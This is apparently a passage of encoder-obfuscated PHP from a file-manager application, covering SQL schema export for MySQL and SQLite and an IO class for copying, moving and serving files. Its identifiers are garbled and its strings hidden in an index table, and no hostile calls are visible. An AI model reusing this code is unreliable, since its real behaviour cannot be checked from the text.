$‘Ì•«¸[$±¼Õ§€[963]]; if ($àş¼Ôƒ¯ == $±¼Õ§€[960]) { $Ì‡©çş³ = explode($±¼Õ§€[4], $‘Ì•«¸[$±¼Õ§€[969]]); $àş¼Ôƒ¯ = $Ì‡©çş³[0]; } $¾¯ŸéîÈ = array($±¼Õ§€[1091] => $±¼Õ§€[13], $±¼Õ§€[908] => $±¼Õ§€[801]); if (isset($¾¯ŸéîÈ[$àş¼Ôƒ¯])) { $àş¼Ôƒ¯ = $¾¯ŸéîÈ[$àş¼Ôƒ¯]; } return $àş¼Ôƒ¯; } public function sqlFromMysql($«êò£â¢, $¿¤™‡† = '') { $’æï¬¤† =& $_SERVER[­á Ş³Ö]; $Â€¸°Ü¡ = $this->model()->db(); $—î°Ò‡Ê = $Â€¸°Ü¡->query($’æï¬¤†[1092] . $«êò£â¢ . $’æï¬¤†[385]); if (!$—î°Ò‡Ê || !$—î°Ò‡Ê[0]) { return !1; } $ÙÖ»æÆ = _get($—î°Ò‡Ê[0], $’æï¬¤†[1093], $’æï¬¤†[12]); if (!$ÙÖ»æÆ) { return !1; } $ŒÜ¼ÒàÊ = "\104\122\117\120\x20\124\101\102\x4c\105\40\x49\x46\40\x45\130\x49\x53\124\123\x20\x60{$«êò£â¢}\140\x3b" . PHP_EOL . $ÙÖ»æÆ . $’æï¬¤†[71]; if ($¿¤™‡† && $¿¤™‡† == $’æï¬¤†[801]) { return $ŒÜ¼ÒàÊ; } $‡ş‰ë¶ = array_change_key_case($GLOBALS[$’æï¬¤†[6]][$’æï¬¤†[21]]); $‡Í¡½İÌ = $‡ş‰ë¶[$’æï¬¤†[968]]; $¼¥ÂöŠ– = $’æï¬¤†[1094] . $‡Í¡½İÌ . $’æï¬¤†[1095] . $«êò£â¢ . $’æï¬¤†[58]; $ÜßÚşšû = $’æï¬¤†[1096] . $«êò£â¢ . $’æï¬¤†[896]; $‘¿§ˆÜ¹ = $Â€¸°Ü¡->query($¼¥ÂöŠ–); if (empty($‘¿§ˆÜ¹)) { $Œõèã‰„ = array($’æï¬¤†[801] => $’æï¬¤†[12], $’æï¬¤†[13] => $’æï¬¤†[12]); return $¿¤™‡† ? $Œõèã‰„[$¿¤™‡†] : $Œõèã‰„; } $œµêÁ÷ = $Â€¸°Ü¡->query($ÜßÚşšû); $¨×Éğ = $’æï¬¤†[12]; $¿ãê»Úõ = array(); foreach ($œµêÁ÷ as $€ËÚĞ¥) { if (!$¨×Éğ && $€ËÚĞ¥[$’æï¬¤†[1097]] == $’æï¬¤†[1098]) { $¨×Éğ = $€ËÚĞ¥[$’æï¬¤†[1099]]; } if (isset($¿ãê»Úõ[$€ËÚĞ¥[$’æï¬¤†[1097]]])) { $¿ãê»Úõ[$€ËÚĞ¥[$’æï¬¤†[1097]]][$’æï¬¤†[1100]][] = $€ËÚĞ¥[$’æï¬¤†[1099]]; continue; } $¿ãê»Úõ[$€ËÚĞ¥[$’æï¬¤†[1097]]] = array($’æï¬¤†[1101] => $€ËÚĞ¥[$’æï¬¤†[1097]], $’æï¬¤†[1100] => array($€ËÚĞ¥[$’æï¬¤†[1099]]), $’æï¬¤†[1102] => $€ËÚĞ¥[$’æï¬¤†[1103]] == $’æï¬¤†[88] ? 0 : 1); } $â·³ˆö¤ = array(); foreach ($¿ãê»Úõ as $€ËÚĞ¥) { $Û¿³ÀŒû = $€ËÚĞ¥[$’æï¬¤†[1101]] == $’æï¬¤†[1098]; $€‰¯¨­ = array($’æï¬¤†[1104], $€ËÚĞ¥[$’æï¬¤†[1102]] == $’æï¬¤†[88] && !$Û¿³ÀŒû ? $’æï¬¤†[1105] : $’æï¬¤†[12], $’æï¬¤†[1106], $’æï¬¤†[1107] . $«êò£â¢ . $’æï¬¤†[11] . ($Û¿³ÀŒû ? $’æï¬¤†[1108] : $€ËÚĞ¥[$’æï¬¤†[1101]]) . $’æï¬¤†[118], $’æï¬¤†[1109], $’æï¬¤†[118] . $«êò£â¢ . $’æï¬¤†[118], $’æï¬¤†[1110] . implode($’æï¬¤†[1111], $€ËÚĞ¥[$’æï¬¤†[1100]]) . $’æï¬¤†[1112]); $â·³ˆö¤[] = implode($’æï¬¤†[53], $€‰¯¨­) . $’æï¬¤†[71]; } $¥øş˜çâ = array(); $›üºšêı = array($’æï¬¤†[1113] => $’æï¬¤†[1114], $’æï¬¤†[1114] => $’æï¬¤†[1114], $’æï¬¤†[288] => $’æï¬¤†[315], $’æï¬¤†[287] => $’æï¬¤†[315]); foreach ($‘¿§ˆÜ¹ as $€ËÚĞ¥) { $€‰¯¨­ = array($’æï¬¤†[118] . $€ËÚĞ¥[$’æï¬¤†[1115]] . $’æï¬¤†[118], isset($›üºšêı[$€ËÚĞ¥[$’æï¬¤†[1116]]]) ? $›üºšêı[$€ËÚĞ¥[$’æï¬¤†[1116]]] : $€ËÚĞ¥[$’æï¬¤†[1117]], $€ËÚĞ¥[$’æï¬¤†[1118]] == $’æï¬¤†[894] ? $’æï¬¤†[1119] : $’æï¬¤†[1120], $€ËÚĞ¥[$’æï¬¤†[1115]] == $¨×Éğ ? $’æï¬¤†[1121] : $’æï¬¤†[12], $€ËÚĞ¥[$’æï¬¤†[945]] ? strtoupper(str_replace($’æï¬¤†[11], $’æï¬¤†[12], $€ËÚĞ¥[$’æï¬¤†[945]])) : $’æï¬¤†[12]); $¥øş˜çâ[] = trim(implode($’æï¬¤†[53], $€‰¯¨­)); } $ßœº¾ñ = array($’æï¬¤†[1122] . $«êò£â¢ . $’æï¬¤†[1123], $’æï¬¤†[1124] . $«êò£â¢ . $’æï¬¤†[1125], implode($’æï¬¤†[50] . PHP_EOL, $¥øş˜çâ), $’æï¬¤†[942]); $†¯çŞÍÌ = implode(PHP_EOL, array_merge($ßœº¾ñ, $â·³ˆö¤)); if ($¿¤™‡† && $¿¤™‡† == $’æï¬¤†[13]) { return $†¯çŞÍÌ; } $Œõèã‰„ = array($’æï¬¤†[801] => $ŒÜ¼ÒàÊ, $’æï¬¤†[13] => $†¯çŞÍÌ); return $¿¤™‡† ? $Œõèã‰„[$¿¤™‡†] : $Œõèã‰„; } public function sqlFromSqlite($äÅùÓêÒ, $Õ‹öÛ©ã = '') { $ˆæ“ÔõÄ =& $_SERVER[­á Ş³Ö]; $šâöØ€Ï = $this->model()->db(); $éßÁîá = "\x50\122\101\x47\x4d\x41\x20\124\101\x42\114\105\137\x49\116\x46\117\x20\50\47{$äÅùÓêÒ}\47\51"; $÷©¤Ùú³ = "\123\105\x4c\105\x43\124\40\52\x20\x46\122\x4f\x4d\40\x73\x71\x6c\151\164\x65\x5f\155\141\x73\x74\145\x72\40\127\x48\105\x52\x45\40\x74\142\154\137\156\141\155\145\x20\x3d\40\47{$äÅùÓêÒ}\x27"; $€Óí±÷¤ = $šâöØ€Ï->query($éßÁîá); if (empty($€Óí±÷¤)) { $ŒÃˆ­Ş¨ = array($ˆæ“ÔõÄ[801] => $ˆæ“ÔõÄ[12], $ˆæ“ÔõÄ[13] => $ˆæ“ÔõÄ[12]); return $Õ‹öÛ©ã ? $ŒÃˆ­Ş¨[$Õ‹öÛ©ã] : $ŒÃˆ­Ş¨; } $úúÏ®Â• = $šâöØ€Ï->query($÷©¤Ùú³); $Á‡€×ïÆ = $Œ”†Ğê‘ = array(); foreach ($úúÏ®Â• as $¡±ˆ®Ä) { if ($¡±ˆ®Ä[$ˆæ“ÔõÄ[33]] == $ˆæ“ÔõÄ[279]) { $Á‡€×ïÆ[] = $¡±ˆ®Ä[$ˆæ“ÔõÄ[1126]]; } else { $Œ”†Ğê‘[$¡±ˆ®Ä[$ˆæ“ÔõÄ[32]]] = $¡±ˆ®Ä[$ˆæ“ÔõÄ[1126]]; } } $ó£¸²Ç = array_merge(array($ˆæ“ÔõÄ[1122] . $äÅùÓêÒ . $ˆæ“ÔõÄ[118]), $Á‡€×ïÆ, array_values($Œ”†Ğê‘)); $ó£¸²Ç = implode($ˆæ“ÔõÄ[71] . PHP_EOL, $ó£¸²Ç) . $ˆæ“ÔõÄ[71]; if ($Õ‹öÛ©ã && $Õ‹öÛ©ã == $ˆæ“ÔõÄ[13]) { return $ó£¸²Ç; } $û¿…ƒ• = array(); $íÓó¡²‘ = array($ˆæ“ÔõÄ[1114] => $ˆæ“ÔõÄ[1127], $ˆæ“ÔõÄ[315] => $ˆæ“ÔõÄ[1128]); $àé¢›ª = $ˆæ“ÔõÄ[12]; foreach ($€Óí±÷¤ as $¡±ˆ®Ä) { if ($¡±ˆ®Ä[$ˆæ“ÔõÄ[57]] == $ˆæ“ÔõÄ[88]) { $àé¢›ª = $¡±ˆ®Ä[$ˆæ“ÔõÄ[32]]; } $œ¦’†µ… = array($ˆæ“ÔõÄ[385] . $¡±ˆ®Ä[$ˆæ“ÔõÄ[32]] . $ˆæ“ÔõÄ[385], isset($íÓó¡²‘[$¡±ˆ®Ä[$ˆæ“ÔõÄ[33]]]) ? $íÓó¡²‘[$¡±ˆ®Ä[$ˆæ“ÔõÄ[33]]] : $¡±ˆ®Ä[$ˆæ“ÔõÄ[33]], $¡±ˆ®Ä[$ˆæ“ÔõÄ[35]] == $ˆæ“ÔõÄ[88] ? $ˆæ“ÔõÄ[1119] : $ˆæ“ÔõÄ[1129] . $¡±ˆ®Ä[$ˆæ“ÔõÄ[56]], $¡±ˆ®Ä[$ˆæ“ÔõÄ[57]] == $ˆæ“ÔõÄ[88] ? $ˆæ“ÔõÄ[1130] : $ˆæ“ÔõÄ[12]); $û¿…ƒ•[] = trim(implode($ˆæ“ÔõÄ[53], $œ¦’†µ…)); } foreach ($Œ”†Ğê‘ as $×®Û‚»â => $‘„çğ³¸) { $ÂÜßê¡ = str_replace($ˆæ“ÔõÄ[1131] . $äÅùÓêÒ . $ˆæ“ÔõÄ[11], $ˆæ“ÔõÄ[12], $×®Û‚»â); $¿¹ÂËÊ¦ = str_replace(array($ˆæ“ÔõÄ[118], $ˆæ“ÔõÄ[953]), $ˆæ“ÔõÄ[385], substr($‘„çğ³¸, stripos($‘„çğ³¸, $ˆæ“ÔõÄ[260]))); if ($ÂÜßê¡ == $ˆæ“ÔõÄ[1108]) { $‘©é´ÍÉ = $ˆæ“ÔõÄ[1132] . $àé¢›ª . $ˆæ“ÔõÄ[1133]; } else { $‘©é´ÍÉ = (stripos($ÂÜßê¡, $ˆæ“ÔõÄ[11]) ? $ˆæ“ÔõÄ[1134] : $ˆæ“ÔõÄ[12]) . ($ˆæ“ÔõÄ[1135] . $ÂÜßê¡ . $ˆæ“ÔõÄ[1136] . $¿¹ÂËÊ¦); } $û¿…ƒ•[] = $‘©é´ÍÉ; } $²»Î¼ò¸ = array($ˆæ“ÔõÄ[1137] . $äÅùÓêÒ . $ˆæ“ÔõÄ[1138], $ˆæ“ÔõÄ[1139] . $äÅùÓêÒ . $ˆæ“ÔõÄ[1140], implode($ˆæ“ÔõÄ[50] . PHP_EOL, $û¿…ƒ•), $ˆæ“ÔõÄ[1141]); $ôŞï¾ú— = implode(PHP_EOL, $²»Î¼ò¸); if ($Õ‹öÛ©ã && $Õ‹öÛ©ã == $ˆæ“ÔõÄ[801]) { return $ôŞï¾ú—; } $ŒÃˆ­Ş¨ = array($ˆæ“ÔõÄ[801] => $ôŞï¾ú—, $ˆæ“ÔõÄ[13] => $ó£¸²Ç); return $Õ‹öÛ©ã ? $ŒÃˆ­Ş¨[$Õ‹öÛ©ã] : $ŒÃˆ­Ş¨; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($äüÎº¢İ, $Ò¥‚ã¥¬) { $†ºôî“ø =& $_SERVER[­á Ş³Ö]; $ù®Í„º = $Ò¥‚ã¥¬; $GLOBALS[$†ºôî“ø[1142]] = $†ºôî“ø[1143] . $äüÎº¢İ; Hook::trigger($†ºôî“ø[1143] . $äüÎº¢İ . $†ºôî“ø[1144], $ù®Í„º); $ÇÒ¦¶£› = self::driverMake($Ò¥‚ã¥¬[0]); if (!$ÇÒ¦¶£›) { return !1; } if (method_exists($ÇÒ¦¶£›, $äüÎº¢İ)) { $¡£áŠ¨â = @call_user_func_array(array($ÇÒ¦¶£›, $äüÎº¢İ), $Ò¥‚ã¥¬); } else { if (method_exists($ÇÒ¦¶£›, $†ºôî“ø[1145])) { $¡£áŠ¨â = @call_user_func_array(array($ÇÒ¦¶£›, $äüÎº¢İ), $Ò¥‚ã¥¬); } else { if (method_exists(self, $äüÎº¢İ)) { $¡£áŠ¨â = @call_user_func_array(array(self, $äüÎº¢İ), $Ò¥‚ã¥¬); } else { $¡£áŠ¨â = call_user_func_array(array(parent, $äüÎº¢İ), $Ò¥‚ã¥¬); } } } Hook::trigger($†ºôî“ø[1143] . $äüÎº¢İ . $†ºôî“ø[1146], $ù®Í„º, $¡£áŠ¨â); return $¡£áŠ¨â; } public static function init($­Œèü°) { return self::driverMake($­Œèü°); } public static function copy($ÅŒ’šÅ¤, $©šàÛÕú, $â»Å“  = false, $ïû“öØº = false) { return self::copyMoveStart($ÅŒ’šÅ¤, $©šàÛÕú, $â»Å“ , $_SERVER[­á Ş³Ö][546], $ïû“öØº); } public static function move($çù¨³ñ”, $¹¡Ï›ô, $»¤¨„÷ç = false, $İºèüÕ = false) { return self::copyMoveStart($çù¨³ñ”, $¹¡Ï›ô, $»¤¨„÷ç, $_SERVER[­á Ş³Ö][548], $İºèüÕ); } private static function copyMoveStart($İöƒ¸Ôó, $ßÈÙ‹Á, $–•ÁõÓÓ, $ÈÜí¥Åû, $²‹´…öí) { $ŞÉğê§ =& $_SERVER[­á Ş³Ö]; $±è…õò = array($İöƒ¸Ôó, $ßÈÙ‹Á, $–•ÁõÓÓ, $²‹´…öí); Hook::trigger($ŞÉğê§[1143] . $ÈÜí¥Åû . $ŞÉğê§[1144], $±è…õò); $úâ­Àƒ¶ = self::copyMove($İöƒ¸Ôó, $ßÈÙ‹Á, $–•ÁõÓÓ, $ÈÜí¥Åû, $²‹´…öí); Hook::trigger($ŞÉğê§[1143] . $ÈÜí¥Åû . $ŞÉğê§[1146], $±è…õò, $úâ­Àƒ¶); return $úâ­Àƒ¶; } public static function saveFile($±ƒÈä¿, $ÚÌÑÑªí, $˜Åé¶¢© = true) { $Ñ§³÷Â =& $_SERVER[­á Ş³Ö]; $‡Šè‰í = self::info($ÚÌÑÑªí); $øí§¶¸ = self::driverMake($±ƒÈä¿); $œ¾€ÌÄ = self::driverMake($ÚÌÑÑªí); $É‚²Šø· = !1; if ($œ¾€ÌÄ->pathParse[$Ñ§³÷Â[1147]]) { $É‚²Šø· = $œ¾€ÌÄ; $ğÅˆ¸¬ = $œ¾€ÌÄ->pathParse[$Ñ§³÷Â[1147]]; $œ¾€ÌÄ = self::driverMake($ğÅˆ¸¬); } if ($øí§¶¸->pathParse[$Ñ§³÷Â[1147]]) { $µºñı·… = $øí§¶¸->pathParse[$Ñ§³÷Â[1147]]; $øí§¶¸ = self::driverMake($µºñı·…); } $¦©„Í™ = $œ¾€ÌÄ->pathFather($ÚÌÑÑªí); $ÖÀÌ”ï = !0; if (!$˜Åé¶¢© && self::driverIsSame($øí§¶¸, $œ¾€ÌÄ)) { $ÖÀÌ”ï = !1; } $‡‚’ú½« = self::copyFile($øí§¶¸, $±ƒÈä¿, $œ¾€ÌÄ, $¦©„Í™, $‡Šè‰í[$Ñ§³÷Â[32]], $ÖÀÌ”ï); if ($É‚²Šø·) { $‡‚’ú½« = $É‚²Šø·->getPathOuter($‡‚’ú½«); } return $‡‚’ú½«; } private static function copyMove($è‘Ä ”†, $ÌŞÌóô¦, $ÓÃ¿ïÄÄ, $¯¹‚Ñæå, $öÓÛ¿ßÌ = false) { $¾ã¼ÑÕ =& $_SERVER[­á Ş³Ö]; if (!$è‘Ä ”† || $è‘Ä ”† == $¾ã¼ÑÕ[8] || !$ÌŞÌóô¦) { return !1; } ignore_timeout(); $€İ¤‡Ùñ = self::driverMake($è‘Ä ”†); $ùğÌ‘¤™ = self::driverMake($ÌŞÌóô¦); $Ô“ªÄ¢É = $¯¹‚Ñæå == $¾ã¼ÑÕ[548]; $­£Ááóı = !1; if ($ùğÌ‘¤™->pathParse[$¾ã¼ÑÕ[1147]]) { $­£Ááóı = $ùğÌ‘¤™; $ÌŞÌóô¦ = $ùğÌ‘¤™->pathParse[$¾ã¼ÑÕ[1147]]; $ùğÌ‘¤™ = self::driverMake($ÌŞÌóô¦); } if ($€İ¤‡Ùñ->pathParse[$¾ã¼ÑÕ[1147]]) { $è‘Ä ”† = $€İ¤‡Ùñ->pathParse[$¾ã¼ÑÕ[1147]]; $€İ¤‡Ùñ = self::driverMake($è‘Ä ”†); } self::check($€İ¤‡Ùñ, $è‘Ä ”†, $ùğÌ‘¤™, $ÌŞÌóô¦); Hook::trigger($¾ã¼ÑÕ[1148], $€İ¤‡Ùñ, $è‘Ä ”†, $ùğÌ‘¤™, $ÌŞÌóô¦); $ç«„´ÑĞ = self::driverIsSame($€İ¤‡Ùñ, $ùğÌ‘¤™); if ($ç«„´ÑĞ) { if ($¯¹‚Ñæå == $¾ã¼ÑÕ[548] && !method_exists($ùğÌ‘¤™, $¾ã¼ÑÕ[1149]) && trim($ÌŞÌóô¦, $¾ã¼ÑÕ[8]) == trim($ùğÌ‘¤™->pathFather($è‘Ä ”†), $¾ã¼ÑÕ[8])) { if ($€İ¤‡Ùñ->pathThis($è‘Ä ”†) != $öÓÛ¿ßÌ && !$€İ¤‡Ùñ->isTypeObject()) { return $€İ¤‡Ùñ->rename($è‘Ä ”†, $öÓÛ¿ßÌ); } return $ùğÌ‘¤™->getPathOuter($è‘Ä ”†); } if (method_exists($ùğÌ‘¤™, $¯¹‚Ñæå)) { return $ùğÌ‘¤™->{$¯¹‚Ñæå}($è‘Ä ”†, $ÌŞÌóô¦, $ÓÃ¿ïÄÄ, $öÓÛ¿ßÌ); } } if ($ç«„´ÑĞ && $¯¹‚Ñæå == $¾ã¼ÑÕ[548] && $ùğÌ‘¤™->getType() == $¾ã¼ÑÕ[106]) { $ÁìÜ¯ÏÃ = $ùğÌ‘¤™->movePath($è‘Ä ”†, $ÌŞÌóô¦, $öÓÛ¿ßÌ); if ($ÁìÜ¯ÏÃ) { return $ÁìÜ¯ÏÃ; } } $ø¯Äæ· = $€İ¤‡Ùñ->isFile($è‘Ä ”†); if (!$ø¯Äæ· && $ùğÌ‘¤™->getType() == $¾ã¼ÑÕ[754] && $€İ¤‡Ùñ->getType() == $¾ã¼ÑÕ[106]) { $ÁìÜ¯ÏÃ = $ùğÌ‘¤™->copyFolderFromIO($€İ¤‡Ùñ, $è‘Ä ”†, $ÌŞÌóô¦, $ÓÃ¿ïÄÄ, $Ô“ªÄ¢É, $öÓÛ¿ßÌ); } else { $ÁìÜ¯ÏÃ = self::copyPath($€İ¤‡Ùñ, $è‘Ä ”†, $ùğÌ‘¤™, $ÌŞÌóô¦, $ÓÃ¿ïÄÄ, $Ô“ªÄ¢É, $ø¯Äæ·, $öÓÛ¿ßÌ); } if ($ÁìÜ¯ÏÃ && $Ô“ªÄ¢É) { $€İ¤‡Ùñ->remove($è‘Ä ”†); } if ($­£Ááóı) { $ÁìÜ¯ÏÃ = $­£Ááóı->getPathOuter($ÁìÜ¯ÏÃ); } return $ÁìÜ¯ÏÃ; } private static function check($³®şŒìœ, $şŞÛ§ÛÊ, $¿Åµêš¯, &$ŸÊúªŒ ) { $õÑÕú´ï =& $_SERVER[­á Ş³Ö]; if (self::driverIsSame($³®şŒìœ, $¿Åµêš¯) && $³®şŒìœ->isFolder($şŞÛ§ÛÊ) && $³®şŒìœ->isParentOf($şŞÛ§ÛÊ, $ŸÊúªŒ )) { show_json(LNG($õÑÕú´ï[1150]), !1); } if (!$³®şŒìœ->exist($şŞÛ§ÛÊ)) { show_json(LNG($õÑÕú´ï[105]), !1); } } private static function copyPath($¢ß‘óò›, $ùæÆµ—, $¶Îè‰ì, $…Ó·ù„Š, $÷–ş¶œ°, $ÊÏÙÃĞ, $Ç´Å‰”ï, $á‹ âÊ = false, $Š³éŒ = true) { $Äú«‡‡ =& $_SERVER[­á Ş³Ö]; $Üá¾Æğ„ = empty($á‹ âÊ) && $á‹ âÊ !== $Äú«‡‡[198] ? $¢ß‘óò›->pathThis($ùæÆµ—) : $á‹ âÊ; if ($÷–ş¶œ°) { $¡ë¥¼Ñ = $¶Îè‰ì->fileNameExist($…Ó·ù„Š, $Üá¾Æğ„); $®„•­¸« = $Üá¾Æğ„; $Üá¾Æğ„ = $¶Îè‰ì->fileNameAuto($…Ó·ù„Š, $Üá¾Æğ„, $÷–ş¶œ°, !$Ç´Å‰”ï); if (!$¡ë¥¼Ñ || $®„•­¸« != $Üá¾Æğ„) { $÷–ş¶œ° = !1; } if ($Š³éŒ && !$÷–ş¶œ°) { $¶Îè‰ì->_data[$Äú«‡‡[1151]] = !0; } } if ($Ç´Å‰”ï) { return self::copyFile($¢ß‘óò›, $ùæÆµ—, $¶Îè‰ì, $…Ó·ù„Š, $Üá¾Æğ„, $ÊÏÙÃĞ); } if ($÷–ş¶œ° == REPEAT_RENAME_FOLDER) { $÷–ş¶œ° = !1; } $Ë‘ÔÃ™ç = rtrim($…Ó·ù„Š, $Äú«‡‡[8]) . $Äú«‡‡[8] . $Üá¾Æğ„; $Úú²Ä¨ = $¶Îè‰ì->mkdir($¶Îè‰ì->getPath($Ë‘ÔÃ™ç), $÷–ş¶œ°); $…Ó·ù„Š = $¶Îè‰ì->getPathInner($Úú²Ä¨); $ÀâìÑ˜¤ = $¢ß‘óò›->listPath($ùæÆµ—, !0); $ÀâìÑ˜¤ = is_array($ÀâìÑ˜¤) ? $ÀâìÑ˜¤ : array($Äú«‡‡[83] => array(), $Äú«‡‡[82] => array()); $èœÑÃÏı = array_merge($ÀâìÑ˜¤[$Äú«‡‡[83]], $ÀâìÑ˜¤[$Äú«‡‡[82]]); foreach ($èœÑÃÏı as $èê‰´¿í) { $Ğ’•©Éè = $èê‰´¿í[$Äú«‡‡[33]] == $Äú«‡‡[200]; $ùæÆµ— = $¢ß‘óò›->getPathInner($èê‰´¿í[$Äú«‡‡[84]]); $³Êë–à¯ = self::copyPath($¢ß‘óò›, $ùæÆµ—, $¶Îè‰ì, $…Ó·ù„Š, $÷–ş¶œ°, $ÊÏÙÃĞ, $Ğ’•©Éè, !1, !1); if (!$³Êë–à¯) { IO::errorTips($Äú«‡‡[1152] . $ùæÆµ— . $Äú«‡‡[70] . $…Ó·ù„Š); } } self::copyMoveKeepInfo($¢ß‘óò›, $ùæÆµ—, $Úú²Ä¨); return $Úú²Ä¨; } private static function copyFile($¡›¬Ş ü, $„³À¿ıÏ, $ãÑõœ¥‘, $”ãí„ª, $€êÄÃ¬Á, $êÔì¨ë½) { $²¥ŠÑ•² =& $_SERVER[­á Ş³Ö]; $”ãí„ª = $ãÑõœ¥‘->getPath(rtrim($”ãí„ª, $²¥ŠÑ•²[8]) . $²¥ŠÑ•²[8] . $€êÄÃ¬Á); $´âŸË„Ê = $²¥ŠÑ•²[1153] . time() . rand_string(5); Hook::trigger($²¥ŠÑ•²[1154], $¡›¬Ş ü, $„³À¿ıÏ, $ãÑõœ¥‘, $”ãí„ª, $€êÄÃ¬Á, $´âŸË„Ê); if (self::driverIsSame($¡›¬Ş ü, $ãÑõœ¥‘)) { if ($êÔì¨ë½) { $áÚÃìÚÒ = $ãÑõœ¥‘->moveFile($„³À¿ıÏ, $”ãí„ª); } else { $áÚÃìÚÒ = $ãÑõœ¥‘->copyFile($„³À¿ıÏ, $”ãí„ª); } Hook::trigger($²¥ŠÑ•²[1155], $¡›¬Ş ü, $„³À¿ıÏ, $ãÑõœ¥‘, $”ãí„ª, $€êÄÃ¬Á, $áÚÃìÚÒ); self::copyMoveKeepInfo($¡›¬Ş ü, $„³À¿ıÏ, $áÚÃìÚÒ); return $áÚÃìÚÒ; } $©ÂÄ„ïÑ = TEMP_FILES; if ($GLOBALS[$²¥ŠÑ•²[6]][$²¥ŠÑ•²[89]][$²¥ŠÑ•²[793]]) { $©ÂÄ„ïÑ = $GLOBALS[$²¥ŠÑ•²[6]][$²¥ŠÑ•²[89]][$²¥ŠÑ•²[793]]; } $ãÖ”ÛãÉ = $©ÂÄ„ïÑ; mk_dir($ãÖ”ÛãÉ); $İï•Òü = $ãÖ”ÛãÉ . $´âŸË„Ê; $ûş¯äİå = $İï•Òü; $İï•Òü = $¡›¬Ş ü->download($„³À¿ıÏ, $İï•Òü); $İï•Òü = $¡›¬Ş ü->iconvApp($İï•Òü); if (substr($İï•Òü, strlen($©ÂÄ„ïÑ)) == $©ÂÄ„ïÑ) { $êÔì¨ë½ = !0; } $áÚÃìÚÒ = $ãÑõœ¥‘->upload($”ãí„ª, $İï•Òü, $êÔì¨ë½); self::remove($ûş¯äİå); Hook::trigger($²¥ŠÑ•²[1155], $¡›¬Ş ü, $„³À¿ıÏ, $ãÑõœ¥‘, $”ãí„ª, $€êÄÃ¬Á, $áÚÃìÚÒ); self::copyMoveKeepInfo($¡›¬Ş ü, $„³À¿ıÏ, $áÚÃìÚÒ); return $áÚÃìÚÒ; } private static function copyMoveKeepInfo($ÛÇØ¨Ìˆ, $ˆ˜ÖŸûö, $¡Å°ãÇ) { if (!$¡Å°ãÇ) { return; } $ÀêæÅä• = $ÛÇØ¨Ìˆ->info($ˆ˜ÖŸûö); if (!is_array($ÀêæÅä•)) { return; } IO::setModifyTime($¡Å°ãÇ, $ÀêæÅä•[$_SERVER[­á Ş³Ö][85]]); } public static function pathFather($ñûÂÜ¸æ) { $ú˜÷ô£ = IO::init($ñûÂÜ¸æ); $È»ÂïÖ€ = $ú˜÷ô£->pathFather($ú˜÷ô£->path); return $ú˜÷ô£->getPathOuter($È»ÂïÖ€); } public static function fileOut($‡åœÄ, $äš ª¿ = false, $ÎĞ—ßœÍ = false, $¥î×¼æª = '') { $ïƒ“œ¦â = self::driverMake($‡åœÄ); if ($ïƒ“œ¦â->isFileOutServer()) { return $ïƒ“œ¦â->fileOutServer($‡åœÄ, $äš ª¿, $ÎĞ—ßœÍ, $¥î×¼æª); } return $ïƒ“œ¦â->fileOut($‡åœÄ, $äš ª¿, $ÎĞ—ßœÍ, $¥î×¼æª); } public static function fileOutImage($¤½õáÚ, $æ¸Òîöğ = 250) { $Æá•ÎÂâ = array(250, 600, 1200, 2000, 3000, 5000); for ($ôƒ¸‚×› = 0; $ôƒ¸‚×› < count($Æá•ÎÂâ); $ôƒ¸‚×›++) { if ($ôƒ¸‚×› == 0 && $æ¸Òîöğ <= $Æá•ÎÂâ[$ôƒ¸‚×›]) { $æ¸Òîöğ = $Æá•ÎÂâ[$ôƒ¸‚×›]; break; } else { if ($æ¸Òîöğ > $Æá•ÎÂâ[$ôƒ¸‚×› - 1] && $æ¸Òîöğ <= $Æá•ÎÂâ[$ôƒ¸‚×›]) { $æ¸Òîöğ = $Æá•ÎÂâ[$ôƒ¸‚×›]; break; } else { if ($ôƒ¸‚×› == count($Æá•ÎÂâ) - 1 && $æ¸Òîöğ > $Æá•ÎÂâ[$ôƒ¸‚×›]) { $æ¸Òîöğ = $Æá•ÎÂâ[$ôƒ¸‚×›]; break; } } } } $Õ¥”ñ–­ = self::driverMake($¤½õáÚ); if ($Õ¥”ñ–­->isFileOutServer()) { return $Õ¥”ñ–­->fileOutImageServer($¤½õáÚ, $æ¸Òîöğ); } return $Õ¥”ñ–­->fileOutImage($¤½õáÚ, $æ¸Òîöğ); } private static function driverIsSame($©ê…ñ‰ø, $ÍóÀÁã) { $Ö£ã«Üà =& $_SERVER[­á Ş³Ö]; $áÏÆ°ƒ = $©ê…ñ‰ø->getType(); $Ï†¶óù‰ = $ÍóÀÁã->getType(); if ($áÏÆ°ƒ != $Ï†¶óù‰) { return !1; } if ($áÏÆ°ƒ == $Ö£ã«Üà[754]) { return !0; } if ($áÏÆ°ƒ == $Ö£ã«Üà[106]) { return !0; } if ($©ê…ñ‰ø->pathDriver == $ÍóÀÁã->pathDriver) { return !0; } return !1; } public static function copyUpdate($É·ÂÎ¸™, $İ¾´íîº) { $ê´øÛª‰ =& $_SERVER[­á Ş³Ö]; if (!IO::exist($É·ÂÎ¸™)) { return !1; } if (!IO::exist($İ¾´íîº)) { IO::mkdir($İ¾´íîº); } $‘÷Ü‘à¡ = array_to_keyvalue(self::listAllSimple($É·ÂÎ¸™), $ê´øÛª‰[84]); $¹ßë «Ù = array_to_keyvalue(self::listAllSimple($İ¾´íîº), $ê´øÛª‰[84]); $ÖØóß = array(); $üí½Ç€Ü = array(); foreach ($‘÷Ü‘à¡ as $¬úÔï¯Ì => $İÜªû²¸) { if (isset($¹ßë «Ù[$¬úÔï¯Ì])) { if ($İÜªû²¸[$ê´øÛª‰[75]] == 1) { continue; } if ($¹ßë «Ù[$¬úÔï¯Ì][$ê´øÛª‰[76]] == $İÜªû²¸[$ê´øÛª‰[76]]) { continue; } } if ($İÜªû²¸[$ê´øÛª‰[75]] == 1) { $üí½Ç€Ü[] = $İ¾´íîº . $ê´øÛª‰[8] . trim($¬úÔï¯Ì, $ê´øÛª‰[8]); continue; } $ˆ£ïÑ”¢ = strstr(trim($¬úÔï¯Ì, $ê´øÛª‰[8]), $ê´øÛª‰[8]) ? get_path_father($¬úÔï¯Ì) : $ê´øÛª‰[12]; $ÖØóß[] = array($ê´øÛª‰[1156] => $İÜªû²¸[$ê´øÛª‰[86]], $ê´øÛª‰[1157] => rtrim($İ¾´íîº, $ê´øÛª‰[8]) . $ê´øÛª‰[8] . $ˆ£ïÑ”¢, $ê´øÛª‰[1158] => $İÜªû²¸); } $¬Æá³ª = array($ê´øÛª‰[200] => $ÖØóß, $ê´øÛª‰[75] => $üí½Ç€Ü); Hook::trigger($ê´øÛª‰[1159], 